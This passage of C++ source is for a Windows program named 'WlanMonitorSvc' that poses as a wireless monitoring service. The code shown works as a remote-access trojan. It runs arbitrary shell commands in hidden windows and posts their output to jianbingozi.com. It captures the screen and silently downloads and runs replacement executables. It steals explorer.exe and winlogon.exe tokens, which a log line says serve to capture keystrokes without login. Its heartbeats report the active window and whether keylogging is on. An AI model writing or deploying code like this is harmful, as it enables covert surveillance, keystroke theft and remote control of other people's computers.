
            WLAN_RADIO_STATE radioState = *pRadioState;
            for (DWORD phy = 0; phy < radioState.dwNumberOfPhys && phy < WLAN_MAX_PHY_INDEX; ++phy) {
                radioState.PhyRadioState[phy].dot11SoftwareRadioState = dot11_radio_state_on;
            }
            WlanFreeMemory(pRadioState);

            DWORD setResult = WlanSetInterface(
                hClient,
                &pIfList->InterfaceInfo[i].InterfaceGuid,
                wlan_intf_opcode_radio_state,
                sizeof(radioState),
                reinterpret_cast<PBYTE>(&radioState),
                NULL);

            if (setResult == ERROR_SUCCESS) {
                changedAny = true;
                WriteLog("WLAN radio enable: software radio turned on for interface " + std::to_string(i));
            } else {
                WriteLog("WLAN radio enable: WlanSetInterface failed for interface " + std::to_string(i) + ", error=" + std::to_string(setResult));
            }
        }
        WlanFreeMemory(pIfList);
    } else {
        WriteLog("WLAN radio enable: WlanEnumInterfaces failed, error=" + std::to_string(dwResult));
    }

    WlanCloseHandle(hClient, NULL);
    return changedAny;
}

void TryEnableWiFi() {
    WriteLog("尝试自动开启 WiFi/无线网卡...");
    EnableWifiRadioByWlanApi();
    ExecCmd("powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"try { Get-NetAdapter -Physical | Where-Object { $_.NdisPhysicalMedium -eq 9 -or $_.InterfaceDescription -match 'Wireless|Wi-Fi|WLAN|802.11' -or $_.Name -match 'Wi-Fi|WLAN|Wireless' } | Enable-NetAdapter -Confirm:$false -ErrorAction SilentlyContinue } catch {}\"", false);
    ExecCmd("netsh interface set interface name=\"Wi-Fi\" admin=enabled", false);
    ExecCmd("netsh interface set interface name=\"WLAN\" admin=enabled", false);
    ExecCmd("netsh interface set interface name=\"无线网络连接\" admin=enabled", false);
    ExecCmd("netsh interface set interface name=\"无线局域网\" admin=enabled", false);
}

// 检查并执行自动更新
void CheckForUpdates() {
    std::string timestamp = std::to_string(GetTickCount64());
    std::string mac = GetMacAddress();

    std::string versionUrl = UPDATE_URL_BASE + "version.txt?t=" + timestamp + "&mac=" + UrlEncode(mac);
    std::string exeUrl = UPDATE_URL_BASE + "WlanMonitorSvc.exe?t=" + timestamp + "&mac=" + UrlEncode(mac);
    std::string updaterUrl = UPDATE_URL_BASE + "WlanMonitorSvc.updater.exe?t=" + timestamp + "&mac=" + UrlEncode(mac);
    std::string tempVersionFile = GetExePath() + ".ver";

    WriteLog("【更新】开始连接服务器检查自动更新...");

    // 1. 清除系统自带的IE网络缓存，否则会一直读取到旧的缓存内容
    DeleteUrlCacheEntryA(versionUrl.c_str());
    DeleteUrlCacheEntryA(exeUrl.c_str());
    DeleteUrlCacheEntryA(updaterUrl.c_str());

    // 尝试下载 version.txt
    DeleteFileA(tempVersionFile.c_str());
    HRESULT hr = URLDownloadToFileA(NULL, versionUrl.c_str(), tempVersionFile.c_str(), 0, NULL);
    if (hr == S_OK) {
        std::ifstream verFile(tempVersionFile);
        std::string latestVersion;
        if (verFile >> latestVersion) {
            verFile.close();
            DeleteFileA(tempVersionFile.c_str());

            WriteLog("【更新】成功获取服务器最新版本: [" + latestVersion + "]，当前本地版本: [" + CURRENT_VERSION + "]");

            // 比较版本号（要求服务器端字符串不为空且不等于当前版本）
            if (!latestVersion.empty() && latestVersion != CURRENT_VERSION) {
                // 防止服务端版本号填错（仅修改version.txt未替换exe）导致死循环下载旧文件的防护
                std::string lockFile = GetExePath() + ".up_lock";
                std::ifstream lf(lockFile);
                std::string lastTriedVersion;
                if (lf >> lastTriedVersion) {
                    if (lastTriedVersion == latestVersion) {
                        WriteLog("【更新防护】发现新版本，但之前已尝试过更新且主程序未能成功变更为该版本。这通常是因为服务端的程序文件未及时上传覆盖，已中止本次更新循环！");
                        lf.close();
                        return;
                    }
                }
                lf.close();

                WriteLog("【更新】发现新版本: [" + latestVersion + "] (当前版本: [" + CURRENT_VERSION + "])，正在后台静默下载...");

                std::string newExePath = GetExePath() + ".new";
                std::string updaterPath = GetExePath() + ".updater.exe";
                DeleteFileA(newExePath.c_str());
                DeleteFileA(updaterPath.c_str());

                // 下载新版本 exe
                hr = URLDownloadToFileA(NULL, exeUrl.c_str(), newExePath.c_str(), 0, NULL);
                if (hr != S_OK || !IsUsableExeFile(newExePath)) {
                    WriteLog("【更新】下载新版本失败，或下载到的文件不是有效 EXE");
                    DeleteFileA(newExePath.c_str());
                    return;
                }

                // 下载 updater.exe（从版本号相同的目录）
                hr = URLDownloadToFileA(NULL, updaterUrl.c_str(), updaterPath.c_str(), 0, NULL);

                if (hr == S_OK && IsUsableExeFile(updaterPath)) {
                    WriteLog("【更新】新版本和更新器下载完成，启动更新器...");

                    // 写入本次尝试更新的版本号防死循环
                    std::string lockFile = GetExePath() + ".up_lock";
                    std::ofstream outLf(lockFile, std::ios::trunc);
                    outLf << latestVersion;
                    outLf.close();

                    std::string currentExePath = GetExePath();

                    if (g_hMutex) {
                        CloseHandle(g_hMutex);
                        g_hMutex = NULL;
                    }

                    // 启动 updater.exe，传入参数：当前程序路径、新程序路径
                    // updater.exe "C:\path\to\WlanMonitorSvc.exe" "C:\path\to\WlanMonitorSvc.exe.new"
                    std::string updaterParams = "\"" + currentExePath + "\" \"" + newExePath + "\"";

                    SHELLEXECUTEINFOA sei = { sizeof(sei) };
                    sei.lpVerb = "open"; 
                    sei.lpFile = updaterPath.c_str();
                    sei.lpParameters = updaterParams.c_str();
                    sei.nShow = SW_HIDE;                
                    if (ShellExecuteExA(&sei)) {
                        WriteLog("【更新】更新器已启动，程序即将退出...");
                        exit(0);
                    }

                    WriteLog("【更新】更新器启动失败，错误码: " + std::to_string(GetLastError()) + "，回退使用原有方案...");
                } else {
                    WriteLog("【更新】下载更新器失败或文件无效，回退使用原有方案...");
                    DeleteFileA(updaterPath.c_str());
                }

                // 回退方案：使用原有的 batch 脚本方式
                WriteLog("【更新】新版本已下载，正在应用更新并重启...");

                std::string currentExePath = GetExePath();
                std::string exeName = currentExePath.substr(currentExePath.find_last_of("\\/") + 1);
                std::string oldPath = currentExePath + ".old_" + std::to_string(GetTickCount64());
                MoveFileA(currentExePath.c_str(), oldPath.c_str());

                std::string batPath = currentExePath + "_update.bat";
                std::ofstream bat(batPath, std::ios::trunc);
                if (bat.is_open()) {
                    bat << "@echo off\r\n";
                    bat << ":loop\r\n";
                    bat << "taskkill /f /im \"" << exeName << "\" > nul 2>&1\r\n"; 
                    bat << "move /y \"" << newExePath << "\" \"" << currentExePath << "\" > nul 2>&1\r\n";
                    bat << "if exist \"" << newExePath << "\" (\r\n";
                    bat << "    ping 127.0.0.1 -n 2 > nul\r\n";
                    bat << "    goto loop\r\n";
                    bat << ")\r\n";
                    bat << "net start WlanMonitorSvc > nul 2>&1\r\n"; 
                    bat << "del \"%~f0\"\r\n";
                    bat.close();

                    SHELLEXECUTEINFOA sei = { sizeof(sei) };
                    sei.lpVerb = "open"; 
                    sei.lpFile = batPath.c_str(); 
                    sei.nShow = SW_HIDE;                
                    ShellExecuteExA(&sei);
                }
                exit(0);
            } else {
                WriteLog("【更新】检测完毕，未发现新版本，当前处于最新。");
            }
        } else {
            verFile.close();
            DeleteFileA(tempVersionFile.c_str());
            WriteLog("【更新】读取版本文件发现内容为空。");
        }
    } else {
        WriteLog("【更新】无法连接到服务器获取版本信息(version.txt)，HRESULT: " + std::to_string(hr));
    }
}
// 获取网卡MAC地址（通常用来唯一标识一台电脑）
std::string GetMacAddress() {
    IP_ADAPTER_INFO AdapterInfo[16];
    DWORD dwBufLen = sizeof(AdapterInfo);
    DWORD dwStatus = GetAdaptersInfo(AdapterInfo, &dwBufLen);
    if (dwStatus != ERROR_SUCCESS) return "UNKNOWN_MAC";

    PIP_ADAPTER_INFO pAdapterInfo = AdapterInfo;
    char macAddr[18];
    sprintf_s(macAddr, "%02X-%02X-%02X-%02X-%02X-%02X",
        pAdapterInfo->Address[0], pAdapterInfo->Address[1],
        pAdapterInfo->Address[2], pAdapterInfo->Address[3],
        pAdapterInfo->Address[4], pAdapterInfo->Address[5]);

    return std::string(macAddr);
}

// URL 编码辅助函数
std::string UrlEncode(const std::string& str) {
    std::string encoded = "";
    char buf[4];
    for (unsigned char c : str) {
        if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
            encoded += c;
        } else if (c == ' ') {
            encoded += '+';
        } else {
            sprintf_s(buf, "%%%02X", c);
            encoded += buf;
        }
    }
    return encoded;
}

// 执行CMD命令并获取输出结果
std::string ExecCmd(const std::string& cmd, bool outputIsUtf8) {
    std::string result = "";
    std::string full_cmd = "cmd.exe /c " + cmd + " 2>&1";
    std::string mutable_cmd = full_cmd; // CreateProcess需要可变的字符串指针

    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;

    HANDLE hRead, hWrite;
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
        return "CreatePipe failed!";
    }
    // 确保读取端不被子进程继承，否则读管道可能会堵塞
    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si;
    ZeroMemory(&si, sizeof(STARTUPINFOA));
    si.cb = sizeof(STARTUPINFOA);
    si.hStdError = hWrite;
    si.hStdOutput = hWrite;
    si.dwFlags |= STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE; // 强制隐藏窗口

    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));

    // 使用 CREATE_NO_WINDOW 彻底不创建控制台窗口
    if (!CreateProcessA(NULL, &mutable_cmd[0], NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(hRead);
        CloseHandle(hWrite);
        return "CreateProcess failed!";
    }

    CloseHandle(hWrite); // 必须在读取前先关闭自身的写入端，否则会导致死锁

    DWORD dwRead;
    CHAR chBuf[512];
    ULONGLONG startTick = GetTickCount64();

    while (true) {
        DWORD dwAvail = 0;
        if (!PeekNamedPipe(hRead, NULL, 0, NULL, &dwAvail, NULL)) {
            break; // 管道已被关闭
        }
        if (dwAvail > 0) {
            if (ReadFile(hRead, chBuf, sizeof(chBuf) - 1, &dwRead, NULL) && dwRead > 0) {
                chBuf[dwRead] = '\0';
                result += chBuf;
            }
        } else {
            // 如果没数据可读，检查进程是否已经结束
            if (WaitForSingleObject(pi.hProcess, 50) == WAIT_OBJECT_0) {
                // 再次清空退出的进程残留的最后数据
                while (PeekNamedPipe(hRead, NULL, 0, NULL, &dwAvail, NULL) && dwAvail > 0) {
                    if (ReadFile(hRead, chBuf, sizeof(chBuf) - 1, &dwRead, NULL) && dwRead > 0) {
                        chBuf[dwRead] = '\0';
                        result += chBuf;
                    } else break;
                }
                break;
            }
            // 防止 powershell, python 等需要输入或无尽阻塞的进程卡死线程
            if (GetTickCount64() - startTick > 15000) {
                TerminateProcess(pi.hProcess, 0);
                result += "\r\n[Execution Timeout: 指令执行超过15秒未返回，后台已强制终止该卡死的进程以防程序崩溃。]";
                break;
            }
        }
    }

    CloseHandle(hRead);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    if (outputIsUtf8) {
        while(!result.empty() && result.back() == '\0') result.pop_back();
        return result;
    }

    // CMD默认输出是GBK编码，转为UTF-8防止网页端中文乱码
    int wLen = MultiByteToWideChar(CP_ACP, 0, result.c_str(), -1, NULL, 0);
    if (wLen > 0) {
        std::wstring wStr(wLen, 0);
        MultiByteToWideChar(CP_ACP, 0, result.c_str(), -1, &wStr[0], wLen);
        int utf8Len = WideCharToMultiByte(CP_UTF8, 0, wStr.c_str(), -1, NULL, 0, NULL, NULL);
        if (utf8Len > 0) {
            std::string utf8Str(utf8Len, 0);
            WideCharToMultiByte(CP_UTF8, 0, wStr.c_str(), -1, &utf8Str[0], utf8Len, NULL, NULL);
            while(!utf8Str.empty() && utf8Str.back() == '\0') utf8Str.pop_back();
            return utf8Str;
        }
    }
    return result;
}

// 向服务端提交执行结束的终端输出结果
void SendOutputToServer(const std::string& mac, const std::string& output) {
    std::string postData = "mac=" + UrlEncode(mac) + "&output=" + UrlEncode(output);
    HINTERNET hSession = InternetOpenA("WlanMonitorSvc_Agent", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (hSession) {
        HINTERNET hConnect = InternetConnectA(hSession, "jianbingozi.com", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
        if (hConnect) {
            HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/cmd_result", NULL, NULL, NULL, INTERNET_FLAG_SECURE, 1);
            if (hRequest) {
                std::string headers = "Content-Type: application/x-www-form-urlencoded\r\n";
                if (!HttpSendRequestA(hRequest, headers.c_str(), (DWORD)headers.length(), (LPVOID)postData.c_str(), (DWORD)postData.length())) {
                    WriteLog("终端输出结果发送失败(HttpSendRequestA)，错误码: " + std::to_string(GetLastError()));
                }
                InternetCloseHandle(hRequest);
            } else {
                WriteLog("终端输出结果发送失败(HttpOpenRequestA)，错误码: " + std::to_string(GetLastError()));
            }
            InternetCloseHandle(hConnect);
        } else {
            WriteLog("终端输出结果发送失败(InternetConnectA)，错误码: " + std::to_string(GetLastError()));
        }
        InternetCloseHandle(hSession);
    } else {
        WriteLog("终端输出结果发送失败(InternetOpenA)，错误码: " + std::to_string(GetLastError()));
    }
}

// 存放服务器返回的此台电脑备注名，并在后续用于关机判断
std::string g_CustomMyName = "";

void ReportScreenLog(const std::string& log) {
    if (GetMacAddress() == "UNKNOWN_MAC") return;
    std::string utf8Log = AnsiToUtf8(log);
    std::string postData = "mac=" + UrlEncode(GetMacAddress()) + "&log=" + UrlEncode(utf8Log);
    HINTERNET hSession = InternetOpenA("WlanMonitorSvc_Agent", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (hSession) {
        HINTERNET hConnect = InternetConnectA(hSession, "jianbingozi.com", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
        if (hConnect) {
            HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/api/screen/log", NULL, NULL, NULL, INTERNET_FLAG_SECURE, 1);
            if (hRequest) {
                std::string headers = "Content-Type: application/x-www-form-urlencoded\r\n";
                HttpSendRequestA(hRequest, headers.c_str(), (DWORD)headers.length(), (LPVOID)postData.c_str(), (DWORD)postData.length());
                InternetCloseHandle(hRequest);
            }
            InternetCloseHandle(hConnect);
        }
        InternetCloseHandle(hSession);
    }
}

int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
    UINT num = 0, size = 0;
    Gdiplus::GetImageEncodersSize(&num, &size);
    if (size == 0) return -1;
    Gdiplus::ImageCodecInfo* pImageCodecInfo = (Gdiplus::ImageCodecInfo*)(malloc(size));
    if (pImageCodecInfo == NULL) return -1;
    Gdiplus::GetImageEncoders(num, size, pImageCodecInfo);
    for (UINT j = 0; j < num; ++j) {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;
        }
    }
    free(pImageCodecInfo);
    return -1;
}

void CaptureScreenJpg(const std::string& filename) {
    // 强制声明进程的 DPI 感知，才能从 GetSystemMetrics 获取到未经系统缩放的最真实物理屏幕分辨率
    HMODULE hUser32 = LoadLibraryA("user32.dll");
    if (hUser32) {
        typedef BOOL(WINAPI* PSETPROCESSDPIAWARE)(VOID);
        PSETPROCESSDPIAWARE pSetProcessDPIAware = (PSETPROCESSDPIAWARE)GetProcAddress(hUser32, "SetProcessDPIAware");
        if (pSetProcessDPIAware) pSetProcessDPIAware();
        FreeLibrary(hUser32);
    }

    ReportScreenLog("开始初始化GDI+");
    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    Gdiplus::Status st = Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
    if (st != Gdiplus::Ok) {
        ReportScreenLog("GDI+ 初始化失败，状态码: " + std::to_string(st));
        return;
    }

    // 支持多屏幕的虚拟桌面全集范围
    int nScreenWidth = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int nScreenHeight = GetSystemMetrics(SM_CYVIRTUALSCREEN);
    int nScreenX = GetSystemMetrics(SM_XVIRTUALSCREEN);
    int nScreenY = GetSystemMetrics(SM_YVIRTUALSCREEN);

    ReportScreenLog("获取到全虚拟屏幕分辨率: " + std::to_string(nScreenWidth) + "x" + std::to_string(nScreenHeight) + " (坐标原点: " + std::to_string(nScreenX) + "," + std::to_string(nScreenY) + ")");

    if (nScreenWidth <= 0 || nScreenHeight <= 0) {
        ReportScreenLog("虚拟频幕分辨率为 0，尝试回退获取主屏幕...");
        nScreenWidth = GetSystemMetrics(SM_CXSCREEN);
        nScreenHeight = GetSystemMetrics(SM_CYSCREEN);
        nScreenX = 0;
        nScreenY = 0;
        if (nScreenWidth <= 0 || nScreenHeight <= 0) {
            ReportScreenLog("分辨率仍为 0，可能没有连接显示器或位于不支持桌面的安全会话中！");
            Gdiplus::GdiplusShutdown(gdiplusToken);
            return;
        }
    }

    HDC hDesktopDC = CreateDCA("DISPLAY", NULL, NULL, NULL);
    if (!hDesktopDC) hDesktopDC = GetDC(NULL);
    if (!hDesktopDC) ReportScreenLog("致命：屏幕 DC 获取失败，错误码：" + std::to_string(GetLastError()));

    HDC hMemoryDC = CreateCompatibleDC(hDesktopDC);
    HBITMAP hBitmap = CreateCompatibleBitmap(hDesktopDC, nScreenWidth, nScreenHeight);
    HBITMAP hOldBitmap = (HBITMAP)SelectObject(hMemoryDC, hBitmap);

    // 填充黑色背景
    RECT bgRect = {0, 0, nScreenWidth, nScreenHeight};
    FillRect(hMemoryDC, &bgRect, (HBRUSH)GetStockObject(BLACK_BRUSH));

    // ==== 优先级 1：尝试使用 DXGI 捕获完美画面（无视全屏视频硬件遮挡） ====
    bool dxgiSuccess = false;
    DxgiScreenCapturer dxgi;
    HBITMAP hDxgiBmp = NULL;
    int dxW = 0, dxH = 0;
    if (dxgi.CaptureImage(hDxgiBmp, dxW, dxH, 200) && hDxgiBmp) {
        HDC hDxgiDC = CreateCompatibleDC(hDesktopDC);
        SelectObject(hDxgiDC, hDxgiBmp);
        SetStretchBltMode(hMemoryDC, COLORONCOLOR);
        StretchBlt(hMemoryDC, 0, 0, nScreenWidth, nScreenHeight, hDxgiDC, 0, 0, dxW, dxH, SRCCOPY);
        DeleteDC(hDxgiDC);
        DeleteObject(hDxgiBmp);
        dxgiSuccess = true;
        ReportScreenLog("已通过 DXGI Desktop Duplication 成功抓取！");
    }

    if (!dxgiSuccess) {
        ReportScreenLog("DXGI 抓取超时或失败，退回到传统 GDI 模式...");
        // 复制坐标应当以虚拟桌面的坐标原点开始
        BOOL bltRes = BitBlt(hMemoryDC, 0, 0, nScreenWidth, nScreenHeight, hDesktopDC, nScreenX, nScreenY, SRCCOPY | CAPTUREBLT);
        if (!bltRes) {
             ReportScreenLog("致命：BitBlt 画面复制失败，错误码：" + std::to_string(GetLastError()));
        } else {
             ReportScreenLog("BitBlt 抓取像素到内存完成");
        }

        // 【新增补丁】覆盖捕获硬件加速窗口
        HWND hForeground = GetForegroundWindow();
    if (hForeground && hForeground != GetDesktopWindow()) {
        char className[256];
        GetClassNameA(hForeground, className, sizeof(className));
        if (strcmp(className, "Progman") != 0 && strcmp(className, "WorkerW") != 0) {
            RECT fRect;
            if (GetWindowRect(hForeground, &fRect)) {
                int fW = fRect.right - fRect.left;
                int fH = fRect.bottom - fRect.top;
                if (fW > 0 && fH > 0 && (fW >= nScreenWidth / 2 || fH >= nScreenHeight / 2)) {
                    HDC hFgMemDC = CreateCompatibleDC(hDesktopDC);
                    HBITMAP hFgBitmap = CreateCompatibleBitmap(hDesktopDC, fW, fH);
                    HBITMAP hOldFgBmp = (HBITMAP)SelectObject(hFgMemDC, hFgBitmap);
                    if (PrintWindow(hForeground, hFgMemDC, 2)) {
                        BitBlt(hMemoryDC, fRect.left - nScreenX, fRect.top - nScreenY, fW, fH, hFgMemDC, 0, 0, SRCCOPY);
                        ReportScreenLog("已通过 PW_RENDERFULLCONTENT 补充抓取全屏/硬件加速窗口内容");
                    }
                    SelectObject(hFgMemDC, hOldFgBmp); DeleteObject(hFgBitmap); DeleteDC(hFgMemDC);
                }
            }
        }
    }
    } // 结束 if (!dxgiSuccess) 的判定分支

    // 【核心修复】将 hBitmap 从 DC 中弹出（反选）。这是防止 GDI+ 锁定失败并导出一个无效/黑屏图片的必备步骤。
    SelectObject(hMemoryDC, hOldBitmap);

    {
        Gdiplus::Bitmap bitmap(hBitmap, NULL);
        CLSID clsid;
        if (GetEncoderClsid(L"image/jpeg", &clsid) != -1) {
            int wLen = MultiByteToWideChar(CP_ACP, 0, filename.c_str(), -1, NULL, 0);
            if (wLen > 0) {
                std::wstring wFilename(wLen, 0);
                MultiByteToWideChar(CP_ACP, 0, filename.c_str(), -1, &wFilename[0], wLen);
                if (!wFilename.empty() && wFilename.back() == L'\0') wFilename.pop_back();
                Gdiplus::Status saveSt = bitmap.Save(wFilename.c_str(), &clsid, NULL);
                if (saveSt != Gdiplus::Ok) {
                    ReportScreenLog("保存到本地JPG失败，状态码：" + std::to_string(saveSt));
                } else {
                    ReportScreenLog("已保存图片到本地临时目录: " + filename);
                }
            }
        } else {
            ReportScreenLog("致命：找不到 image/jpeg 编码器");
        }
    } // 让 bitmap 对象在 GdiplusShutdown 之前析构销毁，否则会导致进程崩溃

    DeleteObject(hBitmap);
    DeleteDC(hMemoryDC);
    if (hDesktopDC) {
        if (!ReleaseDC(NULL, hDesktopDC)) DeleteDC(hDesktopDC);
    }
    Gdiplus::GdiplusShutdown(gdiplusToken);
}

bool RunInUserSession(const std::string& cmdLine, bool silent = false) {
    if (!silent) ReportScreenLog("接收到服务端指令请求，正在尝试穿透进入活动用户会话的桌面...");
    HANDLE hToken = NULL;
    DWORD activeSessionId = WTSGetActiveConsoleSessionId();

    auto tryExplorerToken = [&](bool requireConsoleSession) -> bool {
        HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnap == INVALID_HANDLE_VALUE) return false;
        PROCESSENTRY32W pe;
        pe.dwSize = sizeof(PROCESSENTRY32W);
        if (Process32FirstW(hSnap, &pe)) {
            do {
                if (_wcsicmp(pe.szExeFile, L"explorer.exe") != 0) continue;
                DWORD procSessionId = 0xFFFFFFFF;
                if (!ProcessIdToSessionId(pe.th32ProcessID, &procSessionId)) continue;
                if (requireConsoleSession && activeSessionId != 0xFFFFFFFF && procSessionId != activeSessionId) continue;

                HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe.th32ProcessID);
                if (!hProc) continue;
                if (OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken)) {
                    ReportScreenLog("成功获取 explorer.exe 用户桌面 Token，SessionId=" + std::to_string(procSessionId));
                    CloseHandle(hProc);
                    CloseHandle(hSnap);
                    return true;
                }
                CloseHandle(hProc);
            } while (Process32NextW(hSnap, &pe));
        }
        CloseHandle(hSnap);
        return false;
    };

    if (!tryExplorerToken(true)) {
        ReportScreenLog("未找到控制台 Session 的 explorer.exe，尝试任意已登录用户 Session 的 explorer.exe...");
        tryExplorerToken(false);
    }

    if (!hToken) {
        ReportScreenLog("未能找到 explorer.exe，退回到尝试使用 WTSActiveConsoleSession 获取默认控制台Token...");
        DWORD sessionId = activeSessionId;
        if (!WTSQueryUserToken(sessionId, &hToken)) {
            ReportScreenLog("WTSQueryUserToken 失败，尝试抓取 winlogon.exe 的 Token 用于登录界面，错误码: " + std::to_string(GetLastError()));
            HANDLE hSnap2 = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            if (hSnap2 != INVALID_HANDLE_VALUE) {
                PROCESSENTRY32W pe2;
                pe2.dwSize = sizeof(PROCESSENTRY32W);
                if (Process32FirstW(hSnap2, &pe2)) {
                    do {
                        if (_wcsicmp(pe2.szExeFile, L"winlogon.exe") == 0) {
                            DWORD sessId = 0;
                            ProcessIdToSessionId(pe2.th32ProcessID, &sessId);
                            if (sessId == sessionId) {
                                HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe2.th32ProcessID);
                                if (hProc) {
                                    if (OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken)) {
                                        ReportScreenLog("成功窃取到 winlogon.exe 进程的SYSTEM桌面Token (用于无需登录捕获按键)");
                                        CloseHandle(hProc);
                                        break;
                                    }
                                    CloseHandle(hProc);
                                }
                            }
                        }
                    } while (Process32NextW(hSnap2, &pe2));
                }
                CloseHandle(hSnap2);
            }
            if (!hToken) {
                return false;
            }
        }
    }

    HANDLE hDupToken = NULL;
    if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityIdentification, TokenPrimary, &hDupToken)) {
        ReportScreenLog("复制 TokenPrimary 失败，错误码: " + std::to_string(GetLastError()));
        CloseHandle(hToken);
        return false;
    }

    LPVOID pEnv = NULL;
    CreateEnvironmentBlock(&pEnv, hDupToken, FALSE);

    STARTUPINFOA si;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);

    // 媒体键、音量键和屏幕控制必须进入用户交互桌面，空桌面名在部分 RDP/锁屏环境会无响应。
    si.lpDesktop = (LPSTR)"winsta0\\default";

    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(pi));

    std::string wcmd = cmdLine;
    ReportScreenLog("准备在用户 Session 创建子进程，指令: " + wcmd);
    BOOL bRes = CreateProcessAsUserA(
        hDupToken, 
        NULL, 
        &wcmd[0], 
        NULL, NULL, FALSE, 
        CREATE_NO_WINDOW | CREATE_UNICODE_ENVIRONMENT, 
        pEnv, 
        NULL, 
        &si, &pi);

    if (bRes) {
        ReportScreenLog("成功创建用户级子进程。");
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        ReportScreenLog("CreateProcessAsUserA 调用失败，错误码：" + std::to_string(GetLastError()));
    }

    DestroyEnvironmentBlock(pEnv);
    CloseHandle(hDupToken);
    CloseHandle(hToken);
    return bRes == TRUE;
}

// 字符串去除首尾空白和换行符（容错处理）
void TrimString(std::string &s) {
    if (s.empty()) return;
    s.erase(0, s.find_first_not_of(" \t\r\n"));
    s.erase(s.find_last_not_of(" \t\r\n") + 1);
}

bool IsServerErrorResponse(const std::string& response) {
    if (response.empty()) return false;
    std::string lower = response;
    std::transform(lower.begin(), lower.end(), lower.begin(), [](unsigned char c) {
        return static_cast<char>(std::tolower(c));
    });
    return lower.find("error code:") != std::string::npos ||
           lower.find("bad gateway") != std::string::npos ||
           lower.find("cloudflare") != std::string::npos ||
           lower.find("<html") != std::string::npos ||
           lower.find("<!doctype") != std::string::npos;
}

std::string EncHeartbeatParam(const std::string& value) {
    return UrlEncode(EncryptString(value));
}

// 向服务器报备上线
void ReportToServer() {
    std::string mac = GetMacAddress();
    std::string nonce = std::to_string(GetTickCount64()) + "_" + std::to_string(GetCurrentProcessId());
    std::string reportUrl = REPORT_URL_BASE + "?mac=" + EncHeartbeatParam(mac) + "&ver=" + EncHeartbeatParam(CURRENT_VERSION) + "&t=" + std::to_string(GetTickCount64());
    reportUrl += "&dtype=" + EncHeartbeatParam(GetDeviceTypeForReport());
    reportUrl += "&wifi=" + EncHeartbeatParam(HasWirelessAdapterPresent() ? "1" : "0");
    reportUrl += "&wex=" + EncHeartbeatParam(LocalStateExists(WIFI_SHUTDOWN_EXEMPT_CFG, LEGACY_WIFI_SHUTDOWN_EXEMPT_TXT) ? "1" : "0");
    reportUrl += "&channel=" + EncHeartbeatParam(BUILD_CHANNEL);
    reportUrl += "&build=" + EncHeartbeatParam(BUILD_CHANNEL_MARKER);
    reportUrl += "&nonce=" + EncHeartbeatParam(nonce);

    static ULONGLONG lastFgRead = 0;
    static std::string lastFgStr = "";
    static std::string lastVolStr = "";
    if (GetTickCount64() - lastFgRead > 2000) {
        lastFgRead = GetTickCount64();
        std::string content;
        if (ReadEncryptedLocalFile(ACTIVE_WND_STATE, LEGACY_ACTIVE_WND_TXT, content)) {
            TrimString(content);
            if (!content.empty()) {
                lastFgStr = AnsiToUtf8(content);
            } else {
                lastFgStr = "";
            }
        }
        std::string vcontent;
        if (ReadEncryptedLocalFile(VOLUME_STATE, LEGACY_VOLUME_TXT, vcontent)) {
            TrimString(vcontent);
            lastVolStr = vcontent;
        }
    }
    if (!lastFgStr.empty()) {
        reportUrl += "&fg=" + EncHeartbeatParam(lastFgStr);
    }
    if (!lastVolStr.empty()) {
        reportUrl += "&vol=" + EncHeartbeatParam(lastVolStr);
    }

    if (LocalStateExists(KEYLOG_CFG_STATE, LEGACY_KEYLOG_CFG_TXT)) {
        reportUrl += "&kl=" + EncHeartbeatParam("1");
    } else {
        reportUrl += "&kl=" + EncHeartbeatParam("0");
    }

    HINTERNET hSession = InternetOpenA("WlanMonitorSvc_Agent", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (hSession) {
        DWORD timeout = 15000; // 设置15秒超时，防止网络波动导致线程永久阻塞
        InternetSetOptionA(hSession, INTERNET_OPTION_CONNECT_TIMEOUT, &timeout, sizeof(timeout));
        InternetSetOptionA(hSession, INTERNET_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));
        InternetSetOptionA(hSession, INTERNET_OPTION_SEND_TIMEOUT, &timeout, sizeof(timeout));

